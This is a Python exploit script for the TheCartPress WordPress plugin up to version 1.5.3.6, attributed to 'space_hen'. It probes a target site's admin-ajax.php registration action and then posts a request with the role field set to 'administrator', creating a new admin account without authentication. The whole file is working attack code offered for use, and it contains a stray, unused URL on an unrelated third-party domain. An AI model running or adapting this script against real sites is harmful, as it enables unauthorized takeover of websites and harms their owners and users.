import os.path
from os import path
import json
import requests;
import sys

def print_banner():
	print("TheCartPress <= 1.5.3.6 - Unauthenticated Privilege Escalation")
	print("Author -> space_hen (www.github.com/spacehen)")
	
def print_usage():
	print("Usage: python3 exploit.py [target url]")
	print("Ex: python3 exploit.py https://example.com")
url = 'https://adti.uz/ru/wp-content-plugins-thecartpress-readme-txt/'
def vuln_check(uri):
	response = requests.get(uri)
	raw = response.text
	if ("User name is required" in raw):
		return True;
	else:
		return False;

def main():

	print_banner()
	if(len(sys.argv) != 2):
		print_usage();
		sys.exit(1);

	base = sys.argv[1]

	ajax_action = 'tcp_register_and_login_ajax'
	admin = '/wp-admin/admin-ajax.php';

	uri = base + admin + '?action=' + ajax_action ;
	check = vuln_check(uri);

	if(check == False):
		print("(*) Target not vulnerable!");
		sys.exit(1)

	data = {
	"tcp_new_user_name" : "admin_02",
	"tcp_new_user_pass" : "admin1234",
	"tcp_repeat_user_pass" : "admin1234",
	"tcp_new_user_email" : "test@test.com",
	"tcp_role" : "administrator"
	}
	print("Inserting admin...");
	response = requests.post(uri, data=data )
	if (response.text == "\"\""):
		print("Success!")
		print("Now login at /wp-admin/")
	else:
		print(response.text)

main();